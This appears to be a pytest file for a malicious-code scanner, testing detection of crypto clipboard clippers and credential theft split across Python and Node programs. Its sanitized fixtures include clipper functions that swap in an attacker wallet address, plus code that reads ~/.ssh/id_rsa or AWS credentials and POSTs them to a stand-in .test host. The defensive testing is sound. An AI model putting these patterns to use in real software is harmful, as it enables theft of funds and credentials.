"""Ruleset 78: two gaps left by the blind red-team experiment and by ruleset 77.

A - ``ST-CLIPPER`` saw a clipper only when it wrote a fixed address through a clipboard API. A
clipper helper can hand the swapped text back to its caller instead: it tests the clipboard text
against an address pattern and returns a fixed address (often spliced from fragments) on a match,
and the text unchanged otherwise. That is now flagged in a file that handles clipboard text, when
the fixed address has the shape the pattern looks for. Validators, formatters, chain selectors,
fallbacks for invalid input and the null address stay clean.

B - Ruleset 77 required the two halves of ``ST-COMBO-EXFIL`` to be code of one language runtime.
Two programs in different runtimes now pair again when the code links them: the file holding the
credential reference writes a path that the file holding the egress reads (a staging file), or one
of the two files starts the other by its file name. The linking line joins the evidence. A path
both sides only read, a launch of some other program, and a file name in a comment do not link.

Sanitized fixtures only: hosts are ``.test``, addresses are fake, nothing is executed.
"""

from __future__ import annotations

from pathlib import Path

from skilltotal.engine import analyze_directory
from skilltotal.models import Component, ThreatClass

CLIPPER = "ST-CLIPPER"
COMBO = "ST-COMBO-EXFIL"
ETH = "0x1111111111111111111111111111111111111111"  # fake, never a real wallet


def _report(root: Path):
    return analyze_directory(root, Component(name="x", type="directory", source=str(root)))


def _ids(root: Path) -> set[str]:
    return {f.id for f in _report(root).findings}


def _write(root: Path, files: dict[str, str]) -> Path:
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8", newline="\n")
    return root


# --- A: a clipper that returns the swapped text ---------------------------------------------

_SAMPLE_SHAPE = """\
const fs = require("node:fs");
const ATTACKER = "bc1q" + "fixtureaddr" + "000000";

function hijack(clipboard) {
  if (/^(bc1|0x)[a-z0-9]+/i.test(clipboard)) {
    return ATTACKER; // the caller writes this back
  }
  return clipboard;
}

module.exports = { hijack };
"""


def test_returned_swap_with_spliced_address_is_malicious(tmp_path: Path) -> None:
    report = _report(_write(tmp_path, {"index.js": _SAMPLE_SHAPE}))
    finding = next(f for f in report.findings if f.id == CLIPPER)
    assert finding.threat_class == ThreatClass.MALICIOUS_INDICATOR
    assert report.risk_level.value in ("high", "critical")
    # The test, the swap, and the address spliced from fragments, each anchored to its line.
    assert [(ev.file, ev.line_start) for ev in finding.evidence] == [
        ("index.js", 5), ("index.js", 6), ("index.js", 2)
    ]


def test_returned_swap_through_a_named_pattern_and_ternary(tmp_path: Path) -> None:
    root = _write(tmp_path, {"swap.ts": f"""\
const MINE = "{ETH}";
const ETH_RE = /^0x[a-fA-F0-9]{{40}}$/;
export const onClipboard = (clipText: string) => ETH_RE.test(clipText.trim()) ? MINE : clipText;
"""})
    assert CLIPPER in _ids(root)


def test_returned_swap_in_python(tmp_path: Path) -> None:
    root = _write(tmp_path, {"helper.py": f"""\
import re

WALLET = "{ETH}"


def swap(text):  # called with pyperclip.paste()
    if re.fullmatch(r"0x[a-fA-F0-9]{{40}}", text):
        return WALLET
    return text
"""})
    assert CLIPPER in _ids(root)


def test_returned_swap_as_python_conditional_expression(tmp_path: Path) -> None:
    root = _write(tmp_path, {"helper.py": f"""\
import re

WALLET = "{ETH}"


def on_clipboard(clipboard_text):
    return WALLET if re.match(r"^0x[a-fA-F0-9]{{40}}", clipboard_text) else clipboard_text
"""})
    assert CLIPPER in _ids(root)


def test_returned_replace_of_every_address(tmp_path: Path) -> None:
    root = _write(tmp_path, {"index.js": f"""\
const MINE = "{ETH[:12]}" + "{ETH[12:]}";
module.exports = (clipboardText) => clipboardText.replace(/0x[a-fA-F0-9]{{40}}/g, MINE);
"""})
    assert CLIPPER in _ids(root)


def test_same_shape_without_any_clipboard_context_is_clean(tmp_path: Path) -> None:
    # Narrowness: without clipboard text in the file the swap is a value mapping, not a clipper.
    root = _write(tmp_path, {"index.js": _SAMPLE_SHAPE.replace("clipboard", "value")})
    assert CLIPPER not in _ids(root)


def test_fallback_for_text_that_is_not_an_address_is_clean(tmp_path: Path) -> None:
    root = _write(tmp_path, {"index.js": f"""\
const DEFAULT = "{ETH}";
function fromClipboard(clipboard) {{
  if (!/^0x[a-fA-F0-9]{{40}}$/.test(clipboard)) return DEFAULT;
  return clipboard;
}}
const shown = (clipboard) => /^0x[a-fA-F0-9]{{40}}$/.test(clipboard) ? clipboard : DEFAULT;
"""})
    assert CLIPPER not in _ids(root)


def test_chain_selector_formatter_and_validator_are_clean(tmp_path: Path) -> None:
    root = _write(tmp_path, {"chains.js": f"""\
// Reads the recipient from the clipboard; never writes it.
const USDT_ERC20 = "{ETH}";
const USDT_TRC20 = "T1111111111111111111111111111111111";
function contractFor(clipboard) {{
  if (/^0x/.test(clipboard)) return USDT_ERC20;
  return USDT_TRC20;
}}
function shorten(clipboard) {{
  if (/^0x[a-fA-F0-9]{{40}}$/.test(clipboard)) return clipboard.slice(0, 6) + "...";
  return clipboard;
}}
const isAddress = (clipboard) => /^0x[a-fA-F0-9]{{40}}$/.test(clipboard);
"""})
    assert CLIPPER not in _ids(root)


def test_null_address_placeholder_is_clean(tmp_path: Path) -> None:
    root = _write(tmp_path, {"redact.js": """\
const ZERO = "0x0000000000000000000000000000000000000000";
const redactClipboard = (clipboardText) => clipboardText.replace(/0x[a-fA-F0-9]{40}/g, ZERO);
"""})
    assert CLIPPER not in _ids(root)


# --- B: two programs linked by a staging file or a launch -------------------------------------

_PY_STAGE = (
    "import os\n\n"
    "STAGE = '/tmp/.cache_k'\n"
    "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
    "with open(STAGE, 'w') as out:\n"
    "    out.write(key)\n"
)
_NODE_SEND_STAGED = (
    "const fs = require('fs');\n"
    "const staged = fs.readFileSync('/tmp/.cache_k', 'utf8');\n"
    "fetch('https://collect.example.test/k', { method: 'POST', body: staged });\n"
)
_PY_PRINT_AWS = (
    "from pathlib import Path\n\n"
    "print((Path.home() / '.aws' / 'credentials').read_text())\n"
)


def _combo(root: Path):
    return next((f for f in _report(root).findings if f.id == COMBO), None)


def test_python_stage_file_read_by_node_sender_pairs(tmp_path: Path) -> None:
    combo = _combo(_write(tmp_path, {"collect.py": _PY_STAGE, "send.js": _NODE_SEND_STAGED}))
    assert combo is not None
    lines = {(ev.file, ev.line_start) for ev in combo.evidence}
    # The credential read, the write of the staging file, its read, and the send.
    assert {("collect.py", 4), ("collect.py", 5), ("send.js", 2), ("send.js", 3)} <= lines
    assert "different languages" in combo.description


def test_stage_file_through_names_on_both_sides_pairs(tmp_path: Path) -> None:
    root = _write(tmp_path, {
        "collect.py": _PY_STAGE,
        "send.mjs": (
            "import { readFile } from 'node:fs/promises';\n"
            "const STAGED = '/tmp/.cache_k';\n"
            "const body = await readFile(STAGED, 'utf8');\n"
            "await fetch('https://collect.example.test/k', { method: 'POST', body });\n"
        ),
    })
    assert COMBO in _ids(root)


def test_node_starting_the_python_reader_pairs(tmp_path: Path) -> None:
    combo = _combo(_write(tmp_path, {
        "collect.py": _PY_PRINT_AWS,
        "index.js": (
            "const { execFileSync } = require('child_process');\n"
            "const path = require('path');\n"
            "const out = execFileSync('python3', [\n"
            "  path.join(__dirname, 'collect.py'),\n"
            "], { encoding: 'utf8' });\n"
            "fetch('https://collect.example.test/aws', { method: 'POST', body: out });\n"
        ),
    }))
    assert combo is not None
    assert ("index.js", 3) in {(ev.file, ev.line_start) for ev in combo.evidence}


def test_python_starting_the_node_sender_pairs(tmp_path: Path) -> None:
    root = _write(tmp_path, {
        "run.py": (
            "import os\nimport subprocess\n\n"
            "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
            "subprocess.run(['node', 'tools/send.js'], input=key, text=True, check=True)\n"
        ),
        "tools/send.js": (
            "let body = '';\n"
            "process.stdin.on('data', (c) => { body += c; });\n"
            "process.stdin.on('end', () => fetch('https://collect.example.test/k', "
            "{ method: 'POST', body }));\n"
        ),
    })
    assert COMBO in _ids(root)


def test_a_path_both_programs_only_read_does_not_pair(tmp_path: Path) -> None:
    root = _write(tmp_path, {
        "deploy.py": (
            "import json\nimport os\n\n"
            "KUBECONFIG = os.path.expanduser('~/.kube/config')\n"
            "settings = json.load(open('config/settings.json'))\n"
        ),
        "web/client.js": (
            "const fs = require('fs');\n"
            "const s = JSON.parse(fs.readFileSync('config/settings.json', 'utf8'));\n"
            "fetch(s.apiBase + '/health', { method: 'POST', body: '{}' });\n"
        ),
    })
    ids = _ids(root)
    assert "ST-SENS-PATH-PY" in ids and "ST-NET-NODE" in ids
    assert COMBO not in ids


def test_launching_another_program_or_naming_the_file_does_not_pair(tmp_path: Path) -> None:
    root = _write(tmp_path, {
        "deploy.py": (
            "import os\nimport subprocess\n\n"
            "KUBECONFIG = os.path.expanduser('~/.kube/config')\n"
            "subprocess.run(['kubectl', '--kubeconfig', KUBECONFIG, 'apply'], check=True)\n"
            "print('next, run client.js by hand')\n"
        ),
        "client.js": (
            "// deploy.py writes nothing this file reads\n"
            "fetch('https://api.example.test/health', { method: 'POST', body: '{}' });\n"
        ),
    })
    assert COMBO not in _ids(root)


def test_a_staging_path_in_a_comment_does_not_pair(tmp_path: Path) -> None:
    root = _write(tmp_path, {
        "collect.py": _PY_STAGE,
        "send.js": (
            "// fs.readFileSync('/tmp/.cache_k') was the old way\n"
            "fetch('https://api.example.test/health', { method: 'POST', body: '{}' });\n"
        ),
    })
    assert COMBO not in _ids(root)


def test_go_server_and_python_devscript_still_do_not_pair(tmp_path: Path) -> None:
    root = _write(tmp_path, {
        "server.go": (
            "package serve\n\nimport \"path/filepath\"\n\n"
            "func keyPath(dir string) string {\n\treturn filepath.Join(dir, \"id_rsa\")\n}\n"
        ),
        "bin/rc.py": (
            "import requests\n\n\ndef rpc(command, params):\n"
            "    return requests.post('http://localhost:5572/' + command, json=params).json()\n"
        ),
    })
    assert COMBO not in _ids(root)
